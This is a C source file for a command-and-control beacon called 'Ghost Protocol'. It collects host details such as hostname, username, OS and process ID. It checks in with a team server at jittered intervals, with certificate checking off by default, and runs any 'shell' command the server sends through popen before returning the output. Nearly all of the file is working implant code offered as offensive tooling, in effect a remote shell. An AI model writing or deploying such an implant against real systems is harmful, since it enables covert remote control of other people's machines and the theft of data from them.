/*
 * Ghost Protocol Beacon - Main C Implementation
 * This is the core C2 beacon that establishes communication with the team server
 */

#include "beacon.h"
#include "communication.h"

// Global variables
static beacon_config_t g_config;
static system_info_t g_sysinfo;
static int g_running = 0;
static command_result_t g_results[64];
static int g_result_count = 0;

int main(int argc, char* argv[]) {
    // Initialize configuration with default values
    memset(&g_config, 0, sizeof(beacon_config_t));
    strcpy(g_config.user_agent, USER_AGENT);
    g_config.sleep_interval = 60;
    g_config.jitter_percent = 10;
    g_config.verify_ssl = 0;
    
    // Parse command line arguments
    if (argc < 2) {
        printf("Usage: %s <server_url> [options]\n", argv[0]);
        printf("Options:\n");
        printf("  --sleep <seconds>     Sleep interval (default: 60)\n");
        printf("  --jitter <percent>    Jitter percentage (default: 10)\n");
        printf("  --user-agent <ua>     HTTP User-Agent string\n");
        printf("  --proxy <url>         Proxy URL\n");
        printf("  --verify-ssl          Verify SSL certificates\n");
        printf("  --beacon-id <id>      Custom beacon ID\n");
        return 1;
    }
    
    // Set server URL
    strncpy(g_config.server_url, argv[1], sizeof(g_config.server_url) - 1);
    
    // Parse additional arguments
    for (int i = 2; i < argc; i += 2) {
        if (i + 1 >= argc) break;
        
        if (strcmp(argv[i], "--sleep") == 0) {
            g_config.sleep_interval = atoi(argv[i + 1]);
        } else if (strcmp(argv[i], "--jitter") == 0) {
            g_config.jitter_percent = atoi(argv[i + 1]);
            if (g_config.jitter_percent > 50) g_config.jitter_percent = 50;
        } else if (strcmp(argv[i], "--user-agent") == 0) {
            strncpy(g_config.user_agent, argv[i + 1], sizeof(g_config.user_agent) - 1);
        } else if (strcmp(argv[i], "--proxy") == 0) {
            strncpy(g_config.proxy_url, argv[i + 1], sizeof(g_config.proxy_url) - 1);
        } else if (strcmp(argv[i], "--beacon-id") == 0) {
            strncpy(g_config.beacon_id, argv[i + 1], sizeof(g_config.beacon_id) - 1);
        } else if (strcmp(argv[i], "--verify-ssl") == 0) {
            g_config.verify_ssl = 1;
            i--; // This option doesn't take a value
        }
    }
    
    // Generate beacon ID if not provided
    if (strlen(g_config.beacon_id) == 0) {
        generate_uuid(g_config.beacon_id);
    }
    
    // Initialize beacon
    if (beacon_initialize(&g_config) != 0) {
        fprintf(stderr, "Failed to initialize beacon\n");
        return 1;
    }
    
    // Start beacon
    if (beacon_start(&g_config) != 0) {
        fprintf(stderr, "Failed to start beacon\n");
        beacon_cleanup();
        return 1;
    }
    
    // Run main loop
    int result = beacon_main_loop(&g_config);
    
    // Cleanup
    beacon_cleanup();
    
    return result;
}

int beacon_initialize(beacon_config_t* config) {
    // Initialize networking
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return -1;
    }
#endif
    
    // Collect system information
    if (collect_system_info(&g_sysinfo) != 0) {
        return -1;
    }
    
    printf("[+] Beacon initialized\n");
    printf("    Beacon ID: %s\n", config->beacon_id);
    printf("    Server: %s\n", config->server_url);
    printf("    Sleep: %ds (jitter: %d%%)\n", config->sleep_interval, config->jitter_percent);
    
    return 0;
}

int beacon_start(beacon_config_t* config) {
    printf("[+] Starting beacon...\n");
    
    // Perform initial check-in
    command_t* commands = NULL;
    int command_count = 0;
    
    int checkin_result;
    if (strncmp(config->server_url, "https://", 8) == 0) {
        checkin_result = https_checkin(config, &g_sysinfo, NULL, 0, &commands, &command_count);
    } else {
        checkin_result = http_checkin(config, &g_sysinfo, NULL, 0, &commands, &command_count);
    }
    
    if (checkin_result == 0) {
        printf("[+] Initial check-in successful\n");
        g_running = 1;
        
        // Free any commands received
        if (commands) {
            free(commands);
        }
        
        return 0;
    } else {
        printf("[-] Initial check-in failed\n");
        return -1;
    }
}

int beacon_main_loop(beacon_config_t* config) {
    printf("[+] Beacon running. Press Ctrl+C to stop.\n");
    
    while (g_running) {
        // Sleep with jitter
        sleep_with_jitter(config->sleep_interval, config->jitter_percent);
        
        // Perform check-in
        command_t* commands = NULL;
        int command_count = 0;
        
        int checkin_result;
        if (strncmp(config->server_url, "https://", 8) == 0) {
            checkin_result = https_checkin(config, NULL, g_results, g_result_count, &commands, &command_count);
        } else {
            checkin_result = http_checkin(config, NULL, g_results, g_result_count, &commands, &command_count);
        }
        
        if (checkin_result == 0) {
            // Clear sent results
            g_result_count = 0;
            
            // Process received commands
            for (int i = 0; i < command_count; i++) {
                if (g_result_count < 64) { // Prevent overflow
                    execute_command(&commands[i], &g_results[g_result_count]);
                    g_result_count++;
                }
            }
            
            // Free commands
            if (commands) {
                free(commands);
            }
        } else {
            printf("[-] Check-in failed, retrying next cycle\n");
        }
    }
    
    printf("[+] Beacon stopped\n");
    return 0;
}

void beacon_cleanup(void) {
#ifdef _WIN32
    WSACleanup();
#endif
    printf("[+] Beacon cleanup complete\n");
}

int collect_system_info(system_info_t* sysinfo) {
    memset(sysinfo, 0, sizeof(system_info_t));
    
#ifdef _WIN32
    // Windows system information
    DWORD size = sizeof(sysinfo->hostname);
    GetComputerNameA(sysinfo->hostname, &size);
    
    size = sizeof(sysinfo->username);
    GetUserNameA(sysinfo->username, &size);
    
    strcpy(sysinfo->os_name, "Windows");
    
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    if (GetVersionExA(&osvi)) {
        snprintf(sysinfo->os_version, sizeof(sysinfo->os_version), 
                "%lu.%lu Build %lu", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    }
    
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    switch(si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            strcpy(sysinfo->architecture, "x64");
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            strcpy(sysinfo->architecture, "x86");
            break;
        default:
            strcpy(sysinfo->architecture, "unknown");
    }
    
    sysinfo->pid = GetCurrentProcessId();
    
    GetCurrentDirectoryA(sizeof(sysinfo->cwd), sysinfo->cwd);
    
#else
    // Linux/Unix system information
    gethostname(sysinfo->hostname, sizeof(sysinfo->hostname));
    
    char* user = getenv("USER");
    if (user) {
        strncpy(sysinfo->username, user, sizeof(sysinfo->username) - 1);
    }
    
    struct utsname uname_data;
    if (uname(&uname_data) == 0) {
        strncpy(sysinfo->os_name, uname_data.sysname, sizeof(sysinfo->os_name) - 1);
        strncpy(sysinfo->os_version, uname_data.release, sizeof(sysinfo->os_version) - 1);
        strncpy(sysinfo->architecture, uname_data.machine, sizeof(sysinfo->architecture) - 1);
    }
    
    sysinfo->pid = getpid();
    
    if (getcwd(sysinfo->cwd, sizeof(sysinfo->cwd)) == NULL) {
        strcpy(sysinfo->cwd, "/");
    }
#endif
    
    // Get IP addresses (simplified - just get first non-loopback)
    strcpy(sysinfo->ip_addresses, "127.0.0.1"); // Placeholder
    
    return 0;
}

void generate_uuid(char* buffer) {
    // Simple UUID generation (not cryptographically secure)
    srand(time(NULL));
    snprintf(buffer, BEACON_ID_LEN, "%08x-%04x-%04x-%04x-%08x%04x",
        rand(), rand() & 0xFFFF, rand() & 0xFFFF, 
        rand() & 0xFFFF, rand(), rand() & 0xFFFF);
}

void get_current_timestamp(char* buffer, size_t buffer_size) {
    time_t now = time(NULL);
    struct tm* tm_info = gmtime(&now);
    strftime(buffer, buffer_size, "%Y-%m-%dT%H:%M:%SZ", tm_info);
}

void sleep_with_jitter(int base_seconds, int jitter_percent) {
    if (jitter_percent > 0) {
        int jitter_range = (base_seconds * jitter_percent) / 100;
        int jitter = (rand() % (2 * jitter_range + 1)) - jitter_range;
        int sleep_time = base_seconds + jitter;
        if (sleep_time < 1) sleep_time = 1;
        sleep(sleep_time);
    } else {
        sleep(base_seconds);
    }
}

int execute_command(command_t* cmd, command_result_t* result) {
    memset(result, 0, sizeof(command_result_t));
    strncpy(result->command_id, cmd->id, sizeof(result->command_id) - 1);
    get_current_timestamp(result->timestamp, sizeof(result->timestamp));
    
    // Basic command handling
    if (strcmp(cmd->command, "shell") == 0) {
        result->success = execute_shell_command(cmd->args, result->output, sizeof(result->output));
    } else if (strcmp(cmd->command, "pwd") == 0) {
#ifdef _WIN32
        GetCurrentDirectoryA(sizeof(result->output), result->output);
#else
        if (getcwd(result->output, sizeof(result->output)) == NULL) {
            strcpy(result->output, "Error getting current directory");
            result->success = 0;
        } else {
            result->success = 1;
        }
#endif
    } else if (strcmp(cmd->command, "exit") == 0) {
        strcpy(result->output, "Beacon shutting down");
        result->success = 1;
        g_running = 0;
    } else {
        snprintf(result->output, sizeof(result->output), "Unknown command: %s", cmd->command);
        result->success = 0;
    }
    
    return 0;
}

int execute_shell_command(const char* command, char* output, size_t output_size) {
    FILE* pipe = popen(command, "r");
    if (!pipe) {
        strncpy(output, "Error: Failed to execute command", output_size - 1);
        return 0;
    }
    
    size_t total_read = 0;
    char buffer[1024];
    
    while (fgets(buffer, sizeof(buffer), pipe) != NULL && total_read < output_size - 1) {
        size_t len = strlen(buffer);
        if (total_read + len < output_size - 1) {
            strcpy(output + total_read, buffer);
            total_read += len;
        } else {
            break;
        }
    }
    
    int exit_status = pclose(pipe);
    return (exit_status == 0) ? 1 : 0;
}
